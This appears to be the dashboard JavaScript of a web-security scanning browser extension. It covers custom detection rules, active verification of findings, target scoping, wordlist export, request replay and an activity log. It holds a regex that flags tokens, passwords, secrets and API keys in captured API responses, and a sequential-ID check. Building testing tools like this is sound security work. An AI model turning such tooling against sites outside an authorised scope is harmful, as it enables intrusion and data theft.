    <p style="color:var(--fg2);margin-bottom:14px;font-size:12px">Add regex patterns to match in page source. Runs on every page.</p>
    <div id="rulesList">${rules.map((r, i) => ruleRowHtml(r, i)).join("")}</div>
    <div class="btn-row" style="margin-top:12px">
      <button class="btn" id="addRuleBtn">+ Add Rule</button>
      <button class="btn primary" id="saveRulesBtn">Save</button>
      <button class="btn" data-action="close-modal">Close</button>
    </div>`;
  $("detailModal").classList.add("open");

  $("addRuleBtn").addEventListener("click", () => {
    const list = $("rulesList");
    const i = list.children.length;
    list.insertAdjacentHTML("beforeend", ruleRowHtml({ name: "", pattern: "", severity: "medium", enabled: true }, i));
  });

  $("saveRulesBtn").addEventListener("click", () => {
    const rules = [];
    document.querySelectorAll("#rulesList > div").forEach(row => {
      const name = row.querySelector(".rule-name")?.value || "";
      const pattern = row.querySelector(".rule-pattern")?.value || "";
      const severity = row.querySelector(".rule-sev")?.value || "medium";
      const enabled = row.querySelector(".rule-toggle")?.checked ?? true;
      if (name && pattern) rules.push({ id: "custom-" + Date.now() + Math.random(), name, pattern, severity, category: "custom", enabled });
    });
    chrome.runtime.sendMessage({ type: "saveCustomRules", rules }, () => { toast("Saved " + rules.length + " rules", "success"); });
  });
});

function ruleRowHtml(r, i) {
  return `<div style="margin-bottom:6px;display:flex;gap:6px;align-items:center">
    <input type="checkbox" ${r.enabled ? 'checked' : ''} class="rule-toggle">
    <input value="${esc(r.name)}" placeholder="Name" style="width:120px;padding:5px;background:var(--bg2);border:1px solid var(--border);color:var(--fg);border-radius:4px;font-size:11px" class="rule-name">
    <input value="${esc(r.pattern)}" placeholder="Regex" style="flex:1;padding:5px;background:var(--bg2);border:1px solid var(--border);color:var(--fg);border-radius:4px;font-size:11px" class="rule-pattern">
    <select style="padding:5px;background:var(--bg2);border:1px solid var(--border);color:var(--fg);border-radius:4px;font-size:11px" class="rule-sev">
      <option${r.severity === "critical" ? " selected" : ""}>critical</option>
      <option${r.severity === "high" ? " selected" : ""}>high</option>
      <option${r.severity === "medium" ? " selected" : ""}>medium</option>
      <option${r.severity === "low" ? " selected" : ""}>low</option>
    </select>
    <button onclick="this.parentElement.remove()" style="padding:3px 8px;background:var(--accent);border:none;color:#fff;border-radius:4px;cursor:pointer;font-size:11px">✕</button>
  </div>`;
}

// ── Utilities ──
function timeAgo(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return s + "s";
  if (s < 3600) return Math.floor(s / 60) + "m";
  if (s < 86400) return Math.floor(s / 3600) + "h";
  return Math.floor(s / 86400) + "d";
}
function esc(s) { return String(s == null ? "" : s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;"); }
function dl(c, t, n) { const b = new Blob([c], { type: t }); const u = URL.createObjectURL(b); const a = document.createElement("a"); a.href = u; a.download = n; document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(u); }

// ── Active Verification ──
async function verifyFinding(domain, hash, btn) {
  if (btn) { btn.textContent = "⏳"; btn.disabled = true; }
  const resultDiv = $("modalVerifyResult");
  if (resultDiv) resultDiv.innerHTML = '<div class="verify-result"><span class="vr-status">Verifying…</span></div>';
  const resp = await send({ type: "VERIFY_FINDING", domain, hash });
  dbg("Verify result:", resp);
  if (btn) { btn.textContent = "⚡ Verify"; btn.disabled = false; }
  if (resultDiv && resp) {
    resultDiv.innerHTML = `<div class="verify-result">
      <span class="vr-status ${resp.status || ''}">${resp.status || 'unknown'}</span> — ${esc(resp.reason || '')}
      ${resp.payload ? `<br><strong>Payload:</strong> <code>${esc(resp.payload)}</code>` : ''}
      ${resp.evidence ? `<br><strong>Evidence:</strong> ${esc(resp.evidence)}` : ''}
    </div>`;
  }
  load();
}

async function markFalsePositive(domain, hash) {
  await send({ type: "SET_VERIFY_STATUS", domain, hash, status: "false_positive" });
  load();
  $("detailModal").classList.remove("open");
}

// ── Scope & Safe Mode ──
async function loadScopeSettings() {
  const [sm, sc] = await Promise.all([
    send({ type: "getSafeMode" }),
    send({ type: "getTargetScope" })
  ]);
  if ($("safeModeToggle")) $("safeModeToggle").checked = sm?.safeMode || false;
  const scopeArr = sc?.scope || [];
  const scopeStr = Array.isArray(scopeArr) ? scopeArr.join(", ") : scopeArr;
  if ($("scopeInput")) $("scopeInput").value = scopeStr;
  updateScopeStatus(scopeStr);
  updateVerifyStats();
}

function updateScopeStatus(scopeStr) {
  const el = $("scopeStatus");
  if (!el) return;
  const hasScope = scopeStr && scopeStr.trim().length > 0;
  if (hasScope) {
    const count = scopeStr.split(/[,\n]/).map(s => s.trim()).filter(Boolean).length;
    el.textContent = count + " DOMAIN" + (count !== 1 ? "S" : "");
    el.style.background = "#0a1a0a";
    el.style.color = "var(--green)";
  } else {
    el.textContent = "NO SCOPE";
    el.style.background = "#2d0a0c";
    el.style.color = "var(--accent)";
  }
}

async function updateVerifyStats() {
  const gf = await send({ type: "getGlobalFindings" });
  if (!gf?.G?.findings) return;
  let verified = 0, total = 0;
  for (const d in gf.G.findings) {
    for (const e of gf.G.findings[d]) {
      total++;
      if (e.verificationStatus === "verified" || e.verificationStatus === "likely") verified++;
    }
  }
  if ($("verifyStats")) $("verifyStats").textContent = `${verified} verified / ${total} total`;
}

$("safeModeToggle").addEventListener("change", async () => {
  await send({ type: "setSafeMode", value: $("safeModeToggle").checked });
});

$("btnSaveScope").addEventListener("click", async () => {
  const val = $("scopeInput").value;
  await send({ type: "setTargetScope", scope: val });
  updateScopeStatus(val);
  const patterns = val.split(/[,\n]/).map(s => s.trim()).filter(Boolean);
  toast(patterns.length ? "Scope active: " + patterns.join(", ") : "Scope cleared — all domains will be scanned.", "success");
});

$("btnClearScope").addEventListener("click", async () => {
  $("scopeInput").value = "";
  await send({ type: "setTargetScope", scope: "" });
  updateScopeStatus("");
});


// ── Batch Verify All High/Critical ──
$("btnVerifyAll").addEventListener("click", async () => {
  const btn = $("btnVerifyAll");
  btn.textContent = "⏳ Verifying…";
  btn.disabled = true;
  const resp = await send({ type: "VERIFY_BATCH", maxCount: 20 });
  dbg("Batch verify result:", resp);
  btn.textContent = "⚡ Verify All High/Crit";
  btn.disabled = false;
  if (resp?.results) {
    const verified = resp.results.filter(r => r.status === "verified").length;
    const likely = resp.results.filter(r => r.status === "likely").length;
    toast(`Batch done: ${resp.total} checked, ${verified} verified, ${likely} likely`, "success");
  } else {
    toast(resp?.reason || "Batch verify failed", "error");
  }
  load();
  updateVerifyStats();
});


// ── Wordlist Export (#33) ──
$("btnWordlists").addEventListener("click", async () => {
  const resp = await send({ type: "GET_WORDLISTS" });
  if (!resp) { toast("No data available", "warning"); return; }
  let html = '<h2>📝 Custom Wordlists</h2><p style="color:var(--fg2);font-size:11px;margin-bottom:16px">Built from all discovered findings, requests, and endpoints. Copy or download each list.</p>';
  const lists = [
    { name: "Parameters", data: resp.params, desc: "All discovered parameter names" },
    { name: "Paths", data: resp.paths, desc: "URL path segments from all requests" },
    { name: "Domains", data: resp.domains, desc: "All scanned domains" },
    { name: "Emails", data: resp.emails, desc: "Emails found in findings" },
    { name: "Technologies", data: resp.techs, desc: "Detected technology fingerprints" },
  ];
  for (const l of lists) {
    if (!l.data?.length) continue;
    html += `<div class="field"><div class="field-label">${esc(l.name)} (${l.data.length}) — ${esc(l.desc)}</div><pre>${esc(l.data.join("\n"))}</pre></div>`;
  }
  const allText = lists.map(l => `# ${l.name}\n${(l.data || []).join("\n")}`).join("\n\n");
  html += `<div class="btn-row"><button class="btn primary" data-action="close-modal">Close</button><button class="btn green" id="btnCopyWordlists">📋 Copy All</button></div>`;
  $("detailBox").innerHTML = html;
  $("detailModal").classList.add("open");
  $("btnCopyWordlists").addEventListener("click", () => {
    navigator.clipboard.writeText(allText).then(() => { $("btnCopyWordlists").textContent = "✅ Copied!"; setTimeout(() => { $("btnCopyWordlists").textContent = "📋 Copy All"; }, 2000); });
  });
});


// ── Download All Unconfirmed ──
$("btnUnconfirmed").addEventListener("click", async () => {
  const resp = await send({ type: "GENERATE_ALL_UNCONFIRMED" });
  if (resp?.ok) {
    const date = new Date().toISOString().slice(0, 10);
    dl(resp.markdown, "text/markdown", `unconfirmed_all_${date}.md`);
  } else {
    toast("Failed to generate unconfirmed package", "error");
  }
});

// ── API Traffic Panel ──
$("btnApiTraffic").addEventListener("click", async () => {
  const resp = await send({ type: "GET_API_TRAFFIC" });
  const traffic = resp?.apiTraffic || {};
  const domains = Object.keys(traffic).sort();
  const SENSITIVE = /user[_-]?id|email|token|role|permission|admin|secret|password|session|api[_-]?key|auth/i;
  const SEQ_ID = /"\s*:\s*[1-9]\d{0,5}\b/;

  let html = '<h2>📡 API Traffic (Fetch/XHR)</h2>';
  const total = domains.reduce((n, d) => n + (traffic[d]?.length || 0), 0);
  html += `<div style="display:flex;gap:16px;margin-bottom:16px;flex-wrap:wrap">`;
  html += `<div style="padding:10px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:6px;text-align:center">
    <div style="font-family:var(--mono);font-size:22px;font-weight:700;color:var(--blue)">${domains.length}</div>
    <div style="font-size:10px;color:var(--fg2)">DOMAINS</div></div>`;
  html += `<div style="padding:10px 16px;background:var(--bg2);border:1px solid var(--border);border-radius:6px;text-align:center">
    <div style="font-family:var(--mono);font-size:22px;font-weight:700;color:var(--green)">${total}</div>
    <div style="font-size:10px;color:var(--fg2)">REQUESTS</div></div>`;
  html += `</div>`;

  if (domains.length === 0) {
    html += '<div style="text-align:center;padding:40px;color:var(--fg3)">No API traffic captured yet. Browse pages with AJAX/fetch calls.</div>';
  } else {
    for (const domain of domains) {
      const entries = traffic[domain] || [];
      const byEndpoint = {};
      for (const e of entries) {
        const key = (e.method || "GET") + " " + (e.url || "").split("?")[0];
        (byEndpoint[key] = byEndpoint[key] || []).push(e);
      }
      html += `<div style="border:1px solid var(--border);border-radius:6px;margin-bottom:10px;overflow:hidden">`;
      html += `<div style="padding:10px 14px;background:var(--bg2);font-family:var(--mono);font-weight:600;font-size:13px">${esc(domain)} <span style="color:var(--fg2);font-size:10px">${entries.length} req</span></div>`;

      for (const [endpoint, reqs] of Object.entries(byEndpoint)) {
        const latest = reqs[reqs.length - 1];
        const body = latest.responseBody || "";
        const hasSensitive = SENSITIVE.test(body);
        const hasSeqId = SEQ_ID.test(body);
        const flags = [];
        if (hasSensitive) flags.push('<span style="font-size:8px;padding:1px 4px;border-radius:3px;background:#2d0a0c;color:var(--accent)">SENSITIVE</span>');
        if (hasSeqId) flags.push('<span style="font-size:8px;padding:1px 4px;border-radius:3px;background:#2d1a0a;color:var(--orange)">SEQ ID</span>');

        const statusColor = latest.status >= 400 ? "var(--accent)" : latest.status >= 300 ? "var(--yellow)" : "var(--green)";
        html += `<details style="border-top:1px solid var(--border)">
          <summary style="padding:8px 14px;font-size:12px;cursor:pointer;display:flex;align-items:center;gap:8px">
            <span style="font-family:var(--mono);font-size:10px;font-weight:700;color:${statusColor}">${latest.status || '?'}</span>
            <span style="font-family:var(--mono);font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(endpoint)}</span>
            <span style="font-size:10px;color:var(--fg2)">${reqs.length}x</span>
            ${flags.join(" ")}
            <button class="btn" style="font-size:9px;padding:2px 6px;border-color:var(--blue);color:var(--blue)" data-replay-url="${esc(latest.url || "")}" data-replay-method="${esc(latest.method || "GET")}" data-replay-body="${esc((latest.requestBody || "").slice(0, 2000))}">⟳ Replay</button>
          </summary>
          <div style="padding:8px 14px;background:var(--bg2);font-size:11px;max-height:300px;overflow:auto">`;
        if (latest.requestBody) html += `<div style="color:var(--fg2);margin-bottom:4px">Request body:</div><pre style="margin:0 0 8px;padding:6px;background:var(--bg1);border-radius:4px;overflow-x:auto;font-size:10px;max-height:100px">${esc(latest.requestBody.slice(0, 500))}</pre>`;
        html += `<div style="color:var(--fg2);margin-bottom:4px">Response (${(body.length / 1024).toFixed(1)}KB):</div>
            <pre style="margin:0;padding:6px;background:var(--bg1);border-radius:4px;overflow-x:auto;font-size:10px;max-height:200px;white-space:pre-wrap">${esc(body.slice(0, 2000))}</pre>
          </div></details>`;
      }
      html += `</div>`;
    }
  }

  html += '<div class="btn-row"><button class="btn primary" data-action="close-modal">Close</button></div>';
  $("detailBox").innerHTML = html;
  $("detailModal").classList.add("open");

  // Replay buttons in API Traffic
  $("detailBox").querySelectorAll("[data-replay-url]").forEach(btn => {
    btn.addEventListener("click", (e) => {
      e.stopPropagation();
      e.preventDefault();
      const req = {
        url: btn.dataset.replayUrl,
        method: btn.dataset.replayMethod || "GET",
        body: btn.dataset.replayBody || undefined
      };
      chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
        if (tabs[0]) {
          chrome.tabs.sendMessage(tabs[0].id, { type: "OPEN_REPLAY_PANEL", request: req }).catch(() => {});
        }
      });
    });
  });
});




// ══════════════════════════════════════════════════════════════════
// ACTIVITY LOG (free + pro)
// ══════════════════════════════════════════════════════════════════
let activityLog = [];
let logCatFilter = "all", logLevelFilter = "all";
let logPanelOpen = false, newLogCount = 0;
const LOG_LEVEL_COLOR = { info: "var(--mut)", success: "#3fb950", warning: "#d29922", error: "#e8403a", debug: "#6e7681" };
const LOG_LEVEL_ICON = { info: "ℹ️", success: "✅", warning: "⚠️", error: "❌", debug: "·" };
const LOG_CATEGORIES = ["scan", "ai", "crawl", "network", "memory", "bridge", "replay", "system"];
const fmtLogTime = ts => new Date(ts).toTimeString().slice(0, 8);

function renderLogEntries() {
  const box = $("logEntries"); if (!box) return;
  const filtered = activityLog.filter(e =>
    (logCatFilter === "all" || e.category === logCatFilter) &&
    (logLevelFilter === "all" || e.level === logLevelFilter));
  box.innerHTML = filtered.slice(-500).map(e =>
    `<div style="display:flex;gap:8px;padding:2px 0;font-family:var(--mono,monospace);font-size:11px">
      <span style="color:var(--mut);flex:none">${fmtLogTime(e.timestamp)}</span>
      <span style="flex:none">${LOG_LEVEL_ICON[e.level] || "·"}</span>
      <span style="color:#58a6ff;flex:none;width:58px">${esc(e.category)}</span>
      <span style="color:${LOG_LEVEL_COLOR[e.level] || "var(--fg)"};flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(e.message)}</span>
      ${e.domain ? `<span style="color:var(--mut);flex:none">${esc(e.domain)}</span>` : ""}
    </div>`).join("") || '<div style="color:var(--mut)">No entries match the filter.</div>';
  if ($("logCount")) $("logCount").textContent = `Showing ${filtered.length} of ${activityLog.length} entries`;
  box.scrollTop = box.scrollHeight;
}

async function showActivityLog() {
  const resp = await send({ type: "GET_ACTIVITY_LOG" });
  activityLog = (resp && resp.log) || [];
  newLogCount = 0; updateLogBadge();
  logPanelOpen = true;
  const chip = (val, cur, attr) => `<span class="log-${attr}" data-${attr}="${val}" style="cursor:pointer;padding:2px 8px;border:1px solid var(--border);border-radius:10px;margin:2px;font-size:10px;${val === cur ? 'background:#1f6feb33;border-color:#58a6ff;color:#58a6ff' : 'color:var(--mut)'}">${val}</span>`;
  const catChips = ["all"].concat(LOG_CATEGORIES).map(c => chip(c, logCatFilter, "cat")).join("");
  const lvlChips = ["all", "info", "success", "warning", "error", "debug"].map(l => chip(l, logLevelFilter, "lvl")).join("");
  $("detailBox").innerHTML =
    `<h2>📋 Activity Log</h2>
     <div style="margin-bottom:6px"><span style="color:var(--mut);font-size:10px">Category:</span> ${catChips}</div>
     <div style="margin-bottom:8px"><span style="color:var(--mut);font-size:10px">Level:</span> ${lvlChips}</div>
     <div id="logEntries" style="max-height:50vh;overflow:auto;background:var(--bg1,#0d1117);border:1px solid var(--border);border-radius:6px;padding:8px"></div>
     <div id="logCount" style="color:var(--mut);font-size:10px;margin-top:6px"></div>
     <div class="btn-row">
       <button class="btn primary" data-action="close-modal">Close</button>
       <button class="btn green" id="logExportBtn">↓ Export Log</button>
       <button class="btn danger" id="logClearBtn">✕ Clear</button>
     </div>`;
  $("detailModal").classList.add("open");
  renderLogEntries();
  $("detailBox").querySelectorAll(".log-cat").forEach(ch => ch.addEventListener("click", () => { logCatFilter = ch.dataset.cat; showActivityLog(); }));
  $("detailBox").querySelectorAll(".log-lvl").forEach(ch => ch.addEventListener("click", () => { logLevelFilter = ch.dataset.lvl; showActivityLog(); }));
  $("logExportBtn").addEventListener("click", exportLog);
  $("logClearBtn").addEventListener("click", async () => { await send({ type: "CLEAR_ACTIVITY_LOG" }); activityLog = []; renderLogEntries(); });
}

function exportLog() {
  const lines = activityLog.map(e => `${new Date(e.timestamp).toISOString()} [${(e.level || "").toUpperCase()}] [${e.category}] ${e.message}${e.domain ? " (" + e.domain + ")" : ""}`).join("\n");
  const blob = new Blob([lines], { type: "text/plain" });
  const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = `yansii-activity-${new Date().toISOString().slice(0, 10)}.txt`; a.click();
}

function updateLogBadge() {
  const b = $("logBadge"); if (!b) return;
  if (newLogCount > 0) { b.style.display = ""; b.textContent = newLogCount > 99 ? "99+" : String(newLogCount); } else b.style.display = "none";
}

chrome.runtime.onMessage.addListener((msg) => {
  if (msg && msg.type === "LOG_ENTRY" && msg.entry) {
    activityLog.push(msg.entry);
    if (activityLog.length > 500) activityLog = activityLog.slice(-500);
    if (logPanelOpen && $("detailModal") && $("detailModal").classList.contains("open") && $("logEntries")) renderLogEntries();
    else { newLogCount++; updateLogBadge(); }
  }
});

if ($("btnActivityLog")) $("btnActivityLog").addEventListener("click", showActivityLog);
document.addEventListener("click", e => { if (e.target && e.target.dataset && e.target.dataset.action === "close-modal") logPanelOpen = false; });

// ── Init ──
load();
loadScopeSettings();
// loadHeadersBadge is defined inside a Pro-only block; guard so the free build
// (where it is stripped) does not throw a ReferenceError that halts the dashboard.
if (typeof loadHeadersBadge === "function") loadHeadersBadge();
setInterval(load, 10000);
